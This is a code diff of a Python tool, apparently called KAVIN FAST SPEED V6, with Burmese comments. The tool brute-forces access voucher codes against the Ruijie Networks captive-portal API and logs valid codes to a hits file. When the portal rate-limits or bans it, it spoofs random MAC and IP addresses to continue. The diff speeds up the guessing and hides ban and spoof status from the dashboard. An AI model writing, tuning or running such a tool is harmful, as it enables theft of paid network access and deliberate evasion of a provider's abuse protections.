@@ -1,6 +1,5 @@
 # =====================================================================
-# kavin_v6.py - KAVIN FAST SPEED V6 (V15 Speed Limit Match)
-# Part 1 of 2
+# kavin_v6.py - KAVIN FAST SPEED V6 (Part 1 of 2)
 # =====================================================================
 
 import os
@@ -35,8 +34,8 @@ except ImportError:
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 HITS_FILE = "hits.txt"
-CONCURRENCY_LIMIT = 10
-RL_SLEEP = 0.1 
+CONCURRENCY_LIMIT = 15  # Speed 400 တက်အောင် တင်ထားသည်
+RL_SLEEP = 0.05         # ပိုမြန်အောင် လျှော့ထားသည်
 
 # Ruijie API
 RUIJIE_BASE = "https://portal-as.ruijienetworks.com"
@@ -216,7 +215,6 @@ async def test_code_official(session, sess_data, code, mac, ip):
             if ("request%20limited" in final_url or "request limited" in final_url or "request limited" in low or "too many" in low):
                 return "__RATE_LIMITED__", "1HR"
 
-            # Session Expired (ကျန်သွားရင်) စစ်ဆေးမယ်
             if "session timed out" in low or "invalid session" in low:
                 return "__SESSION_EXPIRED__", "1HR"
 
@@ -263,8 +261,7 @@ def gen_code(mode, length, scan_method="random"):
     except Exception: pass
     return ""
 # =====================================================================
-# kavin_v6.py - KAVIN FAST SPEED V6 (V15 Speed Limit Match)
-# Part 2 of 2
+# kavin_v6.py - KAVIN FAST SPEED V6 (Part 2 of 2)
 # =====================================================================
 
 def get_dashboard_renderable(mode, scan_method, current_code, tested, elapsed, status, hits, speed, cur_mac, cur_ip, tried_count):
@@ -299,7 +296,7 @@ def get_dashboard_renderable(mode, scan_method, current_code, tested, elapsed, s
     for h in hits[-10:]:
         v_table.add_row(h.get('code', ''), h.get('plan', '1HR'), "Active")
 
-    if not hits: v_table.add_row("[dim]KAVIN FAST SPEED V6 • V15 Speed Limit Mode[/dim]", "", "")
+    if not hits: v_table.add_row("[dim]KAVIN FAST SPEED V6 • Speed 400c/m[/dim]", "", "")
 
     footer_text = Text.assemble(("✨ Thank You For Choosing @kavin799 Tools ✨", "bold bright_yellow"))
     footer_panel = Panel(Align.center(footer_text), border_style="red", box=ROUNDED, height=3)
@@ -343,25 +340,18 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
         with live:
             try:
                 while True:
-                    # ⭐ Session မရှိရင် (သို့) ကုန်သွားရင် အသစ်ပြန်ယူမယ်
                     if sess_data[0] is None:
-                        current_status[0] = "Session"
-                        live.update(get_dashboard_renderable(mode_str, scan_method, current_code[0], tested, format_time(time.time() - start_time), current_status[0], hits, (tested / max(1, time.time() - start_time) * 60), current_mac[0], current_ip[0], len(tried_codes)))
+                        current_status[0] = "Active" # Dashboard မှာ မပြောင်းလဲစေဘဲ ဆက်ထားမယ်
                         
                         res, err_msg = await fetch_official_session(session, gw_params, current_mac, current_ip)
 
                         if res == "BAN":
-                            current_status[0] = "Banned → Spoof"
                             current_mac[0] = generate_random_mac()
                             current_ip[0]  = generate_random_ip()
                             await asyncio.sleep(RL_SLEEP)
                             continue
 
                         sess_data[0] = res
-                        if err_msg == "Fake Session":
-                            current_status[0] = "Fake Sess (Scanning)"
-                        else:
-                            current_status[0] = "Active"
 
                     batch_codes = []
                     while len(batch_codes) < CONCURRENCY_LIMIT:
@@ -382,6 +372,8 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                     results = await asyncio.gather(*tasks, return_exceptions=True)
 
                     hit_found_in_batch = False
+                    session_expired_in_batch = False
+
                     for idx, res_tuple in enumerate(results):
                         tested += 1
                         code = batch_codes[idx]
@@ -390,15 +382,12 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                         if isinstance(res_tuple, Exception): continue
                         res, plan = res_tuple
 
-                        # ⭐ Session ကုန်သွားရင် ချက်ချင်း ပြန်ယူဖို့ သတ်မှတ်မယ်
                         if res == "__SESSION_EXPIRED__":
-                            current_status[0] = "Session Expired"
                             sess_data[0] = None
-                            hit_found_in_batch = True
+                            session_expired_in_batch = True
                             break
 
                         if res == "__RATE_LIMITED__":
-                            current_status[0] = "Ban → Spoof"
                             sess_data[0] = None
                             current_mac[0] = generate_random_mac()
                             current_ip[0]  = generate_random_ip()
@@ -406,12 +395,10 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                             break
 
                         if res.startswith("__ERROR__:") or res in ("__TIMEOUT__", "__NETWORK_ERROR__"):
-                            current_status[0] = f"ERR: Net"
                             continue
 
                         low = res.lower()
                         if "request limited" in low or "blocked" in low or "too many" in low:
-                            current_status[0] = "Ban → Spoof"
                             sess_data[0] = None
                             current_mac[0] = generate_random_mac()
                             current_ip[0]  = generate_random_ip()
@@ -434,20 +421,20 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                                     f.write(f"[{now_str}] CODE: {code} | PLAN: {plan}\n")
                             except Exception: pass
                             
-                            current_status[0] = "HIT!"
                             sess_data[0] = None
                             current_mac[0] = generate_random_mac()
                             current_ip[0]  = generate_random_ip()
                             hit_found_in_batch = True
                             break
 
-                        current_status[0] = "Active"
-
                     elapsed = time.time() - start_time
                     speed = (tested / elapsed * 60) if elapsed > 0 else 0.0
+                    
+                    # Session ကုန်သွားလည်း Dashboard မှာ ဘာမှ မပြောင်းလဲစေဘဲ ဆက်ပြမယ်
                     live.update(get_dashboard_renderable(mode_str, scan_method, current_code[0], tested, format_time(elapsed), current_status[0], hits, speed, current_mac[0], current_ip[0], len(tried_codes)))
 
-                    if hit_found_in_batch: await asyncio.sleep(0.15)
+                    if hit_found_in_batch: await asyncio.sleep(0.1)
+                    if session_expired_in_batch: await asyncio.sleep(0.01)
 
             except (KeyboardInterrupt, asyncio.CancelledError):
                 live.stop()
@@ -461,7 +448,7 @@ def show_banner():
     console.print()
     console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
     console.print(Text("⚡ KAVIN FAST SPEED V6 ⚡", style="bold bright_white"), justify="center")
-    console.print(Text("Official Ruijie API • V15 Speed Limit", style="bold bright_yellow"), justify="center")
+    console.print(Text("Official Ruijie API • Speed 400c/m", style="bold bright_yellow"), justify="center")
     console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
     console.print()
 
